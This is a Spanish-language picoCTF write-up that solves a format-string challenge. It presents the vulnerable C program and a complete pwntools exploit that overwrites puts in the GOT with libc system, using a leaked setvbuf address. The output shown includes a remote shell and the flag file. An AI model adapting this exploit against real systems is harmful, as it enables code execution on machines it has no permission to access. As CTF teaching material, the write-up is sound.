# Format String 3

En este ejercicio nos dan 4 cosas:

* Binario
* Código en C
* Lib-c
* Intérprete

Para dejarlo todo listo para trabajar con el como cualquier otro binario sin intérprete propio o Lib-c vamos a usar el comando `Pwninit`. Este comando crea un nuevo binario a partir del que esté en el directorio actual y lo enlaza con todo lo que necesita para tener que despreocuparnos.

```c
./format-string-3_patched
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7ffff7e5a3f0
hola
hola
/bin/sh
```

El programa hace un leak de una dirección, nos devuelve nuestro input y también `/bin/sh`.

Vamos a analizar el código del programa:

```c
#include <stdio.h>
#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf); // Dirección Leakeada
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf); // Vulnerabilidad de Format String

	puts(normal_string);  // '/bin/sh'

	return 0;
}
```

Vale, hay una vulnerabilidad de format strings ya que no se le indica en ningún momento al `printf` el formato de la variable que hay que printear. Como podemos ver hay un `puts(/bin/sh)`. Eso llama bastante la atención, si conseguimos cambiar ese `puts` por un `system` ejecutaríamos una shell. Como tenemos una vulnerabilidad de format strings vamos a intentar sobrescribir el got y hacer ese reemplazo.

Para eso podemos intentar usar la función `mtstr_payload` de pwntools. Para usarla y que funcione necesitamos 2 cosas:

* La posición en el Stack de un Parámetro controlable.
* Un diccionario con la dirección en memoria a sobrescribir (en este caso la dirección de puts en el got) y el nuevo valor que queremos introducir (en este caso la dirección de system)

Vamos a hacer un fuzzing del stack para sacar valores importantes:

```c
python fuzz.py

38: [b'ABCDEF0x3325464544434241'] // Nuestro input (ABCDEF)
```

Hemos encontrado la dirección en el Stack donde está nuestro parámetro controlable! Ahora solo queda encontrar la dirección de `puts` y la de `system` para el diccionario que se pasa como argumento a la función `mtstr_payload`.

Para sacar la dirección de puts lo podemos hacer de la siguiente manera:

```c
pwndbg> disas main
Dump of assembler code for function main:
   . . .
   0x00000000004012ef <+172>:	mov    rdi,rax
   0x00000000004012f2 <+175>:	call   0x401080 <puts@plt> // Dirección de PUTS en la PLT, esta no nos vale 
   0x00000000004012f7 <+180>:	mov    eax,0x0
   . . .
```

```c
pwndbg> disas 0x401080
Dump of assembler code for function puts@plt:
   0x0000000000401080 <+0>:	endbr64
   0x0000000000401084 <+4>:	bnd jmp QWORD PTR [rip+0x2f8d]        # 0x404018 <puts@got.plt>
   0x000000000040108b <+11>:	nop    DWORD PTR [rax+rax*1+0x0]
End of assembler dump.
```

Esa si que nos vale! La dirección de puts es: `0x404018`. Solo nos queda la dirección de System. Esto se complica un poco mas ya que `system` no se usa en el programa así que no podemos simplemente hacer un `disas`.

Entonces, como la sacamos? Pues la tenemos que sacar desde la Lib-c. Aquí pasa una cosa, no podemos simplemente buscar en la libc que nos dan por la dirección y ya ya que tiene esa libc tiene PIE habilitado.

Parece que no es posible sacar la dirección pero tenemos que recordar algo, el programa nos dá una dirección de la libc, si conseguimos saber que distancia hay desde la dirección del leak a `system` podremos en la maquina remota saber en que dirección está `system`.

Vamos a calcular el offset:

```python
pwndbg> x/gx system
0x7ffff7e2f760 <system>:	0x74ff8548fa1e0ff3
pwndbg> x/gx setvbuf
0x7ffff7e5a3f0 <setvbuf>:	0x55415641fa1e0ff3

offset = 0x7ffff7e5a3f0 - 0x7ffff7e2f760 = 0x2ac90 # Lo tenemos!
```

Ahora que tenemos todo lo que hace falta podemos hacer el script:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-3_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("rhea.picoctf.net", 60672)

    return r


def main():
    r = conn()
    controlable = 38
    
    r.recvlines(1)
    leaked = r.recvline().decode().strip() 
    info(f'Leaked: {leaked}')
    
    leaked_vbuf = int(leaked.split()[-1], 16) # Guardamos la dirección que leakea el programa
    info(f'Leaked VBUF: {hex(leaked_vbuf)}')
    
    puts_address = 0x404018 # Dirección de Puts
    
    vbuf_to_sustem_offset = 0x7ffff7e5a3f0 - 0x7ffff7e2f760 # Calculo del offset
    info(f'vbuf_to_sustem_offset: {hex(vbuf_to_sustem_offset)}')
    system_address= leaked_vbuf - vbuf_to_sustem_offset # Calculo de la dirección system
    info(f'System Address: {hex(system_address)}')
    valor = {puts_address: system_address} # Diccionario (DIRECCIÓN A SOBRESCRBIR: NUEVO VALOR)
    
    payload = fmtstr_payload(controlable, valor, write_size='byte')
    
    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()

```

Vamos a probar a ver si va:

```c
python solve.py            
[*] '/home/ub1cu0/Desktop/picoCTF/format-string-3/format-string-3_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fd000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[*] '/home/ub1cu0/Desktop/picoCTF/format-string-3/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[*] '/home/ub1cu0/Desktop/picoCTF/format-string-3/ld-linux-x86-64.so.2'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to rhea.picoctf.net on port 51335: Done
[*] Leaked: Okay I'll be nice. Here's the address of setvbuf in libc: 0x716f9495a3f0
[*] Leaked VBUF: 0x716f9495a3f0
[*] vbuf_to_sustem_offset: 0x2ac90
[*] System Address: 0x716f9492f760
[*] Switching to interactive mode
whoami
root
$ ls
Makefile
artifacts.tar.gz
flag.txt // LA FLAG
format-string-3
format-string-3.c
ld-linux-x86-64.so.2
libc.so.6
metadata.json
profile
$  
```

Estamos dentro!
